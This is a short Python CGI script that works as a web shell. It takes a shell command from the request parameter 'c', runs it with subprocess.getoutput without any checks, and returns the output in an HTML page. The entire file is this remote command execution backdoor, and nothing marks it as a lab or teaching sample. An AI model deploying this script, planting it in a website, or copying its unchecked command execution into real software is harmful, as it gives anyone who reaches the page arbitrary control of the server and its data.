#!/usr/bin/python3

import os
import subprocess
import cgi

print("Content-type:text/html")
print()

form = cgi.FieldStorage()
data=form.getvalue("c")

print("<pre><h3>")
out=subprocess.getoutput(data)
print(out)
print("</h3></pre>")

